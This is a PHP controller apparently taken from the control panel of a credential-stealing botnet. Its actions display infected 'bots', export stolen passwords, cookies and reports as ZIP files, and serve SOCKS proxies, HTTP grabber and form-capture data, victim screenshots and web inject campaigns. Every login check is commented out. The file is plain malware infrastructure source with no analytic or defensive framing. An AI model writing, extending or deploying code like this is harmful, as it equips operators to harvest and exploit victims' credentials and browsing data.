<?php
session_start();

class Controller_Bot extends Controller {

    public function action_index() {
        //if (Authorization::checkLogin()) {
            $this->model = new Model_Bot();
            $this->model->setRequestData($this->data);
            $settings = $this->model->getSettings();
            $bot_info = $this->model->getBotInfo();
            $screenshotsData = $this->model->getScreenshots();
            $injectsCampaignsData = $this->model->getCampaignsList();
            $netViewInfo = $this->model->getNetViewInfo();
            $softwareInfo = $this->model->getSoftwareInfo();

            if (empty($bot_info))
            {
                Route::StartPage();
            }

            $reports_info = $this->model->getReportsInfo();
            $this->view->addJavaScripts(array(
                'js/plugins/gridgallery/js/modernizr.custom.js',
                'js/plugins/gridgallery/js/imagesloaded.pkgd.min.js',
                'js/plugins/gridgallery/js/masonry.pkgd.min.js',
                'js/plugins/gridgallery/js/classie.js',
                'js/plugins/gridgallery/js/cbpgridgallery.js',
                'plugins/pagination/pagination.min.js',
                'js/custom/pagination.js',
                'js/pages/bot.js'
            ));
            $this->view->addCSS(array(
                'js/plugins/gridgallery/css/component.css',
                'plugins/pagination/pagination.css',
                'css/pages/bot.css'
            ));
            $this->view->addModalWindows(array(
                'bot-tab-forms-show-more-info.php',
                'bot-tab-injects-show-injects.php'
            ));
            $this->view->generate('bot_view.php', array(
                'settings' => $settings,
                'bot_info' => $bot_info,
                'reports_info' => $reports_info,
                'screenshotsData' => $screenshotsData,
                'injectsCampaignsData' => $injectsCampaignsData,
                'netViewInfo' => $netViewInfo,
                'softwareInfo' => $softwareInfo
            ));
        //}
    }

    public function action_getpasswords() {
        //if (Authorization::checkLogin()) {
            $this->model = new Model_Bot();
            $this->model->setRequestData($this->data);
            die($this->model->sortPasswords());
        //}
    }

    public function action_get_passwords_data() {
        //if (Authorization::checkLogin()) {
            $this->model = new Model_Bot();
            $this->model->setRequestData($this->data);
            die($this->model->getPasswordsData());
        //}
    }

    public function action_passwords_save_zip() {
        //if (Authorization::checkLogin()) {
            $this->model = new Model_Bot();
            $this->model->setRequestData($this->data);
            $this->model->savePasswordsToZip();
        //}
    }

    public function action_cookies_save_zip() {
        //if (Authorization::checkLogin()) {
            $this->model = new Model_Bot();
            $this->model->setRequestData($this->data);
            $this->model->saveCookiesToZip();
        //}
    }

    public function action_reports_save_zip() {
        //if (Authorization::checkLogin()) {
            $this->model = new Model_Bot();
            $this->model->setRequestData($this->data);
            $this->model->saveReportsToZip();
        //}
    }

    public function action_getsocks() {
        //if (Authorization::checkLogin()) {
            $this->model = new Model_Bot();
            $this->model->setRequestData($this->data);
            die($this->model->getSocks());
        //}
    }

    public function action_get_http_grabber_data() {
        //if (Authorization::checkLogin()) {
            $this->model = new Model_Bot();
            $this->model->setRequestData($this->data);
            die($this->model->getGrabberData());
        //}
    }

    public function action_get_forms_data() {
       // if (Authorization::checkLogin()) {
            $this->model = new Model_Bot();
            $this->model->setRequestData($this->data);
            die($this->model->getFormsData());
        //}
    }

    public function action_get_screenshots_data() {
        //if (Authorization::checkLogin()) {
            $this->model = new Model_Bot();
            $this->model->setRequestData($this->data);
            //die($this->model->getScreenshotsData());
            die($this->model->getScreenshotsDataTest());
        //}
    }

    public function action_get_injects_list() {
        //if (Authorization::checkLogin()) {
            $this->model = new Model_Bot();
            $this->model->setRequestData($this->data);
            die($this->model->getInjectsList());
        //}
    }
}